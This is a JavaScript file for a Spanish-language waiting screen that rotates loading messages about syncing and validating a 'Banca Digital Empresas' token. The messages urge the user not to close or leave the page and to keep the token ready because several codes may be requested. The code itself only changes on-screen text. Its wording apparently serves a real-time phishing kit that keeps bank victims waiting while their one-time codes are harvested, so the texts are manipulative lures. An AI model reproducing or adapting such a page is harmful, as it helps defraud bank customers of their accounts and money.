document.addEventListener('DOMContentLoaded', function () {
    const mensajesPie = [
        'Mantén esta pantalla abierta hasta completar la sincronización.',
        'No cierres ni actualices la ventana para no interrumpir el proceso.',
        'Evita cambiar de pestaña o aplicación mientras dure la verificación.',
        'El sistema puede solicitar varios códigos como parte de la seguridad.',
        'Permanece atento a los avisos que aparezcan en pantalla.'
    ];

    const mensajesCarga = [
        {
            titulo: 'Preparando sincronización de tu dispositivo',
            hint: 'Permanece en esta pantalla mientras se establece la conexión segura.'
        },
        {
            titulo: 'Sincronización en proceso',
            hint: 'El sistema puede pedirte escanear o ingresar códigos en los siguientes pasos.'
        },
        {
            titulo: 'Validando tu dispositivo token',
            hint: 'No cierres ni actualices esta ventana hasta finalizar la vinculación.'
        },
        {
            titulo: 'Conectando con Banca Digital Empresas',
            hint: 'Este paso suele tardar solo unos momentos; aguarda en esta pantalla.'
        },
        {
            titulo: 'Verificación de seguridad activa',
            hint: 'Ten a la mano tu token por si se requiere un nuevo código.'
        }
    ];

    const pieEl = document.querySelector('.netespera-dynamic-msg');
    const labelEl = document.getElementById('neLoadingLabel');
    const hintEl = document.getElementById('neLoadingHint');

    function mezclar(lista) {
        const copia = lista.slice();
        for (let i = copia.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [copia[i], copia[j]] = [copia[j], copia[i]];
        }
        return copia;
    }

    function fadeSwap(elemento, texto) {
        if (!elemento) return;
        elemento.style.opacity = '0.45';
        setTimeout(function () {
            elemento.textContent = texto;
            elemento.style.opacity = '1';
        }, 400);
    }

    function fadeSwapCarga(mensaje) {
        if (labelEl) {
            labelEl.style.opacity = '0.45';
        }
        if (hintEl) {
            hintEl.style.opacity = '0.45';
        }
        setTimeout(function () {
            if (labelEl) {
                labelEl.textContent = mensaje.titulo;
                labelEl.style.opacity = '1';
            }
            if (hintEl) {
                hintEl.textContent = mensaje.hint;
                hintEl.style.opacity = '1';
            }
        }, 400);
    }

    if (labelEl) labelEl.style.transition = 'opacity 0.4s ease';
    if (hintEl) hintEl.style.transition = 'opacity 0.4s ease';
    if (pieEl) pieEl.style.transition = 'opacity 0.4s ease';

    if (pieEl) {
        let colaPie = mezclar(mensajesPie);
        let indicePie = 0;

        function rotarPie() {
            fadeSwap(pieEl, colaPie[indicePie]);
            indicePie += 1;
            if (indicePie >= colaPie.length) {
                colaPie = mezclar(mensajesPie);
                indicePie = 0;
            }
        }

        rotarPie();
        setInterval(rotarPie, 10000);
    }

    if (labelEl && hintEl) {
        let indiceCarga = 0;

        setInterval(function () {
            indiceCarga = (indiceCarga + 1) % mensajesCarga.length;
            fadeSwapCarga(mensajesCarga[indiceCarga]);
        }, 8000);
    }
});
